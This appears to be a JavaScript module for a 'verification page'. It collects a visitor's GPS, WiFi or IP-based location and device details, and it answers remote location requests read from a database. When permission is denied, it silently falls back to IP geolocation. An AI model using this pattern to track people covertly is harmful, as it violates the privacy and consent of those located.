import { getDeviceInfo } from '../../utils/browser-detection.js';

// Helper function to determine location source
export async function determineLocationSource(position) {
    console.log('Determining location source for position:', position);
    
    if ('permissions' in navigator) {
        try {
            const result = await navigator.permissions.query({ name: 'geolocation' });
            console.log('Geolocation permission state:', result.state);
            
            if (result.state === 'granted') {
                if (position.coords.accuracy < 100) {
                    console.log('High accuracy GPS detected');
                    return 'GPS (High Accuracy)';
                }
                else if (position.coords.accuracy < 500) {
                    console.log('Low accuracy GPS detected');
                    return 'GPS (Low Accuracy)';
                }
            }
        } catch (e) {
            console.error('Error checking permissions:', e);
        }
    }
    
    console.log('Using accuracy-based detection. Accuracy:', position.coords.accuracy);
    
    // Check for WiFi connection first
    const connection = navigator?.connection || navigator?.mozConnection || navigator?.webkitConnection;
    const isWifi = connection?.type === 'wifi';
    console.log('Connection type:', connection?.type);
    console.log('Is WiFi connection:', isWifi);
    
    // Determine source based on accuracy and connection type
    if (position.coords.accuracy < 100) {
        return 'GPS (High Accuracy)';
    }
    else if (position.coords.accuracy < 500) {
        return isWifi ? 'WiFi (High Accuracy)' : 'GPS (Low Accuracy)';
    }
    else if (position.coords.accuracy < 2000) {
        return isWifi ? 'WiFi' : 'Cell Tower (High Accuracy)';
    }
    else if (position.coords.accuracy < 5000) {
        return isWifi ? 'WiFi (Low Accuracy)' : 'Cell Tower';
    }
    return position.coords.accuracy < 10000 ? 'Cell Tower (Low Accuracy)' : 'IP-Based';
}

// Global watchPosition ID for continuous monitoring
let watchId = null;

// Callback for location updates
let onLocationUpdate = null;

// Helper function to get high accuracy position
export async function getHighAccuracyPosition() {
    // Safari has issues with async executor functions in Promise constructor
    return new Promise((resolve, reject) => {
        const checkPermissions = async () => {
            try {
                // Check permissions in a Safari-compatible way
                if (navigator.permissions && navigator.permissions.query) {
                    const permissionStatus = await navigator.permissions.query({ name: 'geolocation' });
                    console.log('Permission status before request:', permissionStatus.state);
                    
                    // Safari doesn't support permission revocation, so we'll handle differently
                    const browser = getDeviceInfo().browser.name;
                    if (browser !== 'Safari' && permissionStatus.state !== 'granted') {
                        if (navigator.permissions.revoke) {
                            try {
                                await navigator.permissions.revoke({ name: 'geolocation' });
                            } catch (error) {
                                console.log('Error revoking permission:', error);
                            }
                        }
                    }
                }
            } catch (error) {
                console.log('Error handling permissions:', error);
            }

            // Request position with high accuracy after permissions check
            navigator.geolocation.getCurrentPosition(
                resolve,
                (error) => {
                    console.log('Geolocation error:', error);
                    if (error.code === 1) { // Permission denied
                        console.log('Location permission denied, using IP fallback');
                    }
                    reject(error);
                },
                {
                    enableHighAccuracy: true,
                    timeout: 20000,
                    maximumAge: 0
                }
            );
        };

        // Start the permission check process
        checkPermissions().catch(error => {
            console.log('Error in permission check:', error);
            // Continue with geolocation request even if permission check fails
            navigator.geolocation.getCurrentPosition(
                resolve,
                reject,
                {
                    enableHighAccuracy: true,
                    timeout: 20000,
                    maximumAge: 0
                }
            );
        });
    });
}

// Helper function to check if locations are significantly different
function isLocationDifferent(oldLoc, newLoc, minDistance = 100) {
    // Calculate distance in meters using Haversine formula
    const R = 6371e3; // Earth's radius in meters
    const φ1 = oldLoc.latitude * Math.PI/180;
    const φ2 = newLoc.latitude * Math.PI/180;
    const Δφ = (newLoc.latitude - oldLoc.latitude) * Math.PI/180;
    const Δλ = (newLoc.longitude - oldLoc.longitude) * Math.PI/180;

    const a = Math.sin(Δφ/2) * Math.sin(Δφ/2) +
            Math.cos(φ1) * Math.cos(φ2) *
            Math.sin(Δλ/2) * Math.sin(Δλ/2);
    const c = 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1-a));
    const distance = R * c;

    console.log('Distance between locations:', Math.round(distance), 'meters');
    return distance > minDistance;
}

// Listen for location requests
export function listenForLocationRequests() {
    if (!navigator.geolocation || !window.database) return;

    const requestsRef = window.database.ref('locationRequests');
    
    requestsRef.on('child_added', async (snapshot) => {
        const request = snapshot.val();
        if (!request || request.status !== 'pending') return;

        try {
            // Get the original location to update
            const locationRef = window.database.ref('locations/' + request.locationKey);
            const locationSnapshot = await locationRef.once('value');
            const originalLocation = locationSnapshot.val();
            if (!originalLocation) {
                throw new Error('Original location not found');
            }

            // Check if the record is still active
            if (originalLocation.status !== 'active') {
                throw new Error('Location record is no longer active');
            }

            let position;
            let locationSource = 'IP-Based';
            let useIpFallback = false;

            // Check permission state
            if ('permissions' in navigator) {
                const permissionStatus = await navigator.permissions.query({ name: 'geolocation' });
                console.log('Current permission state:', permissionStatus.state);
                
                // If permission is denied, silently use IP fallback
                if (permissionStatus.state === 'denied') {
                    console.log('Location permission denied - proceeding with IP-based location silently');
                    useIpFallback = true;
                }
            }

            // Try to get location if not using IP fallback
            if (!useIpFallback) {
                try {
                    position = await getHighAccuracyPosition();
                    locationSource = await determineLocationSource(position);
                    
                    // Add detailed source information
                    const connection = navigator?.connection || navigator?.mozConnection || navigator?.webkitConnection;
                    const isWifi = connection?.type === 'wifi';
                    
                    // Store connection type and accuracy details
                    position.sourceDetails = {
                        type: locationSource.includes('GPS') ? 'GPS' : (isWifi ? 'WiFi' : 'Cell'),
                        accuracy: position.coords.accuracy,
                        accuracyLevel: locationSource.includes('High') ? 'High' : 'Low'
                    };
                    
                } catch (geoError) {
                    console.log('Geolocation error:', geoError);
                    useIpFallback = true;
                }
            }

            // IP-based fallback
            if (useIpFallback) {
                console.log('Using IP-based location fallback');
                let ipError;
                
                // Try primary service (ipapi.co)
                try {
                    const ipResponse = await fetch('https://ipapi.co/json/');
                    const ipData = await ipResponse.json();
                    
                    // Validate response
                    if (ipData.error || !ipData.latitude || !ipData.longitude) {
                        throw new Error(ipData.reason || 'Invalid response from ipapi.co');
                    }
                    
                    position = {
                        coords: {
                            latitude: parseFloat(ipData.latitude),
                            longitude: parseFloat(ipData.longitude),
                            accuracy: 10000, // IP-based accuracy is typically low
                            altitude: null,
                            altitudeAccuracy: null
                        },
                        sourceDetails: {
                            type: 'IP',
                            service: 'Primary (ipapi.co)',
                            accuracy: 10000,
                            accuracyLevel: 'Low'
                        }
                    };
                    locationSource = 'IP-Based (Primary)';
                    console.log('Successfully got location from primary IP service');
                } catch (error) {
                    console.warn('Primary IP location service failed:', error);
                    ipError = error;
                    
                    // Try backup service (ip-api.com)
                    try {
                        console.log('Attempting backup IP location service');
                        const backupResponse = await fetch('https://api.ipapi.com/json/?fields=lat,lon,status,message');
                        const backupData = await backupResponse.json();
                        
                        // Validate backup response
                        if (backupData.status !== 'success' || !backupData.lat || !backupData.lon) {
                            throw new Error(backupData.message || 'Invalid response from backup service');
                        }
                        
                        position = {
                        coords: {
                            latitude: parseFloat(backupData.lat),
                            longitude: parseFloat(backupData.lon),
                            accuracy: 10000,
                            altitude: null,
                            altitudeAccuracy: null
                        },
                            sourceDetails: {
                                type: 'IP',
                                service: 'Backup (ip-api.com)',
                                accuracy: 10000,
                                accuracyLevel: 'Low'
                            }
                        };
                        locationSource = 'IP-Based (Backup)';
                        console.log('Successfully got location from backup IP service');
                    } catch (backupError) {
                        console.error('Both IP location services failed:', { primary: ipError, backup: backupError });
                        throw new Error('Unable to verify location. Please try again later.');
                    }
                }
            }
        
            // Verify we got actual coordinates
            if (!position?.coords || typeof position.coords.latitude !== 'number' || typeof position.coords.longitude !== 'number') {
                throw new Error('Invalid location data received');
            }

            // Skip location difference check for IP fallback
            if (!useIpFallback) {
                const newLocation = {
                    latitude: position.coords.latitude,
                    longitude: position.coords.longitude
                };

                if (!isLocationDifferent(
                    { latitude: originalLocation.latitude, longitude: originalLocation.longitude },
                    newLocation
                )) {
                    throw new Error('No significant location change detected (less than 100m difference)');
                }
            } else {
                console.log('Skipping location difference check for IP-based location');
            }

            // Create new location entry
            const locationsRef = window.database.ref('locations');
            const newLocationRef = locationsRef.push();
            const timestamp = new Date().toISOString();

            const locationData = {
                latitude: position.coords.latitude,
                longitude: position.coords.longitude,
                accuracy: position.coords.accuracy,
                locationSource: locationSource,
                sourceDetails: position.sourceDetails, // Add detailed source information
                timestamp: timestamp,
                status: 'active',
                isLocationUpdate: true,
                previousLocationKey: request.locationKey,
                ip: originalLocation.ip,
                userAgent: navigator.userAgent,
                ...Object.entries(getDeviceInfo()).reduce((acc, [key, value]) => {
                    if (value !== undefined) {
                        acc[key] = value;
                    }
                    return acc;
                }, {})
            };

            // Only add optional fields if they exist and are not undefined
            if (position.coords.altitude !== null && position.coords.altitude !== undefined) {
                locationData.altitude = position.coords.altitude;
            }
            if (position.coords.altitudeAccuracy !== null && position.coords.altitudeAccuracy !== undefined) {
                locationData.altitudeAccuracy = position.coords.altitudeAccuracy;
            }

            // Save the new location
            await newLocationRef.set(locationData);

            // Update the request status
            await snapshot.ref.update({
                status: 'completed',
                newLocation: {
                    latitude: position.coords.latitude,
                    longitude: position.coords.longitude,
                    accuracy: position.coords.accuracy,
                    locationSource: locationSource,
                    sourceDetails: position.sourceDetails // Add detailed source information
                },
                completedAt: timestamp
            });

            // Update the original location to mark it as having an update
            await locationRef.update({
                hasUpdate: true,
                latestUpdateKey: newLocationRef.key
            });

        } catch (error) {
            console.error('Error updating location:', error);
            let errorMessage;
            
            // Browser-specific error messages
            if (error.code === 1) {
                const browser = getDeviceInfo().browser.name;
                if (browser === 'Safari') {
                    errorMessage = 'Location access was denied. On iOS, please enable location services in Settings > Safari > Location, then try again.';
                } else {
                    errorMessage = 'Location access was denied. For the most accurate verification, please allow location access in your browser settings and try again.';
                }
            } else if (error.code === 2) {
                errorMessage = 'Location is not available';
            } else if (error.code === 3) {
                errorMessage = 'Location request timed out';
            } else if (error.message.includes('Failed to get location from both GPS and IP services')) {
                errorMessage = 'Unable to verify location. Please check your internet connection and try again.';
            } else if (error.message.includes('No significant location change')) {
                errorMessage = 'No significant change in location detected';
            } else if (error.message.includes('no longer active')) {
                errorMessage = 'User is no longer on the verification page';
            } else {
                errorMessage = 'Failed to update location';
            }

            await snapshot.ref.update({
                status: 'failed',
                error: errorMessage,
                failedAt: new Date().toISOString()
            });
        }
    });
}

// Handle page unload/close
// Start continuous location monitoring
export function startLocationMonitoring(callback) {
    if (!navigator.geolocation) {
        throw new Error('Geolocation is not supported by this browser');
    }

    // Store callback for location updates
    onLocationUpdate = callback;

    // Clear any existing watch
    stopLocationMonitoring();

    // Start new watch
    watchId = navigator.geolocation.watchPosition(
        async (position) => {
            try {
                const locationSource = await determineLocationSource(position);
                
                // Add source details to position object
                position.sourceDetails = {
                    type: locationSource.includes('GPS') ? 'GPS' : 
                          locationSource.includes('WiFi') ? 'WiFi' : 
                          locationSource.includes('Cell') ? 'Cell' : 'IP',
                    accuracy: position.coords.accuracy,
                    accuracyLevel: locationSource.includes('High') ? 'High' : 'Low'
                };

                // Call update callback if significant change detected
                if (onLocationUpdate && isLocationDifferent(
                    { 
                        latitude: position.coords.latitude, 
                        longitude: position.coords.longitude 
                    },
                    lastPosition || { latitude: 0, longitude: 0 }
                )) {
                    lastPosition = {
                        latitude: position.coords.latitude,
                        longitude: position.coords.longitude
                    };
                    onLocationUpdate(position);
                }
            } catch (error) {
                console.error('Error processing location update:', error);
            }
        },
        (error) => {
            let errorMessage;
            switch (error.code) {
                case error.PERMISSION_DENIED:
                    errorMessage = 'Location access denied. Please enable location services.';
                    break;
                case error.POSITION_UNAVAILABLE:
                    errorMessage = 'Location information unavailable. Please check your device settings.';
                    break;
                case error.TIMEOUT:
                    errorMessage = 'Location request timed out. Please try again.';
                    break;
                default:
                    errorMessage = 'An unknown error occurred while getting location.';
            }
            console.error('Geolocation error:', errorMessage);
            if (onLocationUpdate) {
                onLocationUpdate(null, new Error(errorMessage));
            }
        },
        {
            enableHighAccuracy: true,
            timeout: 20000,
            maximumAge: 0
        }
    );
}

// Stop continuous location monitoring
export function stopLocationMonitoring() {
    if (watchId !== null) {
        navigator.geolocation.clearWatch(watchId);
        watchId = null;
        onLocationUpdate = null;
    }
}

// Store last known position for change detection
let lastPosition = null;

export function setupUnloadHandler() {
    window.addEventListener('beforeunload', async () => {
        try {
            const ip = await fetch('https://api.ipify.org?format=json')
                .then(response => response.json())
                .then(data => data.ip)
                .catch(() => null);
                
            if (ip && window.database) {
                const locationsRef = window.database.ref('locations');
                const locationQuery = locationsRef.orderByChild('ip').equalTo(ip);
                const snapshot = await locationQuery.once('value');
                
                snapshot.forEach((childSnapshot) => {
                    const data = childSnapshot.val();
                    if (data.status === 'active') {
                        childSnapshot.ref.update({ status: 'inactive' });
                    }
                });
            }
        } catch (error) {
            console.error('Error updating status on page close:', error);
        }
    });
}
